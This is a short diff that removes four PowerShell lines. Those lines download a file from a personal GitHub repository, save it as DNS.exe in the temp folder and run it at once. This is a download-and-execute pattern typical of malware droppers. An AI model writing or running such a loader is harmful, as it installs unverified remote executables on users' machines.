@@ -1,4 +1,0 @@
-$url = 'https://github.com/FREAKMANCHIK/WORK/blob/main/files/DNS'
-$outputPath = "$env:TEMP\DNS.exe"
-Invoke-WebRequest -Uri $url -OutFile $outputPath
-Start-Process -FilePath $outputPath
